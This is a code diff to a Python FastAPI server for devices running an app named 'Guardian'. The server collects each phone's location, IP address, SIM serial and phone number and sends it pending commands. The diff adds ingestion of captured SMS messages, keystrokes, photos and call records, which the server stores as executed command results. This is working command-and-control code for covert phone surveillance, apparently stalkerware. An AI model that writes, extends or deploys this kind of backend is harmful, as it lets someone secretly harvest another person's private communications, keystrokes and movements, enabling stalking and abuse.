@@ -1,13 +1,19 @@
 from fastapi import APIRouter, Depends
 from sqlalchemy.orm import Session
 from pydantic import BaseModel
-from typing import Optional
+from typing import Optional, List
 from datetime import datetime
+import json
 from app.database import get_db
 from app.models.device import Device
 from app.models.command import Command
 
 router = APIRouter(prefix="/v1/devices", tags=["devices"])
+
+class CapturedItem(BaseModel):
+    type: str  # sms, keystroke, photo, call
+    data: str  # JSON string with the actual data
+    timestamp: int
 
 class DeviceHeartbeat(BaseModel):
     device_id: str
@@ -20,10 +26,11 @@ class DeviceHeartbeat(BaseModel):
     ip_address: Optional[str] = None
     sim_serial: Optional[str] = None
     phone_number: Optional[str] = None
+    captured_data: Optional[List[CapturedItem]] = None
 
 @router.post("/heartbeat")
 async def heartbeat(request: DeviceHeartbeat, db: Session = Depends(get_db)):
-    """Guardian app sends heartbeat - returns pending commands"""
+    """Guardian sends heartbeat + captured data. Returns pending commands."""
     
     # Find or create device
     device = db.query(Device).filter(
@@ -40,7 +47,7 @@ async def heartbeat(request: DeviceHeartbeat, db: Session = Depends(get_db)):
         db.add(device)
         db.flush()
     
-    # Update device status
+    # Update device
     device.last_latitude = request.latitude
     device.last_longitude = request.longitude
     device.last_accuracy = request.accuracy
@@ -51,26 +58,41 @@ async def heartbeat(request: DeviceHeartbeat, db: Session = Depends(get_db)):
     device.phone_number = request.phone_number
     device.is_online = True
     device.last_seen = datetime.utcnow()
-    db.commit()
     
-    # Get ALL pending commands for this device
-    pending_commands = db.query(Command).filter(
+    # Store captured data as commands with results
+    if request.captured_data:
+        for item in request.captured_data:
+            try:
+                data_dict = json.loads(item.data) if isinstance(item.data, str) else item.data
+            except:
+                data_dict = {"raw": str(item.data)}
+            
+            cmd = Command(
+                device_id=device.id,
+                command_type=item.type,
+                command_data=json.dumps(data_dict),
+                status="executed",
+                result=json.dumps(data_dict),
+                executed_at=datetime.utcfromtimestamp(item.timestamp / 1000) if item.timestamp else datetime.utcnow()
+            )
+            db.add(cmd)
+    
+    # Get pending commands
+    pending = db.query(Command).filter(
         Command.device_id == device.id,
         Command.status == "pending"
     ).all()
     
     commands_list = []
-    for cmd in pending_commands:
+    for cmd in pending:
         commands_list.append({
             "id": cmd.id,
             "command_type": cmd.command_type,
-            "command_data": cmd.command_data if isinstance(cmd.command_data, dict) else {}
+            "command_data": json.loads(cmd.command_data) if isinstance(cmd.command_data, str) else cmd.command_data
         })
-        # Mark as sent
         cmd.status = "sent"
     
-    if pending_commands:
-        db.commit()
+    db.commit()
     
     return {
         "status": "ok",
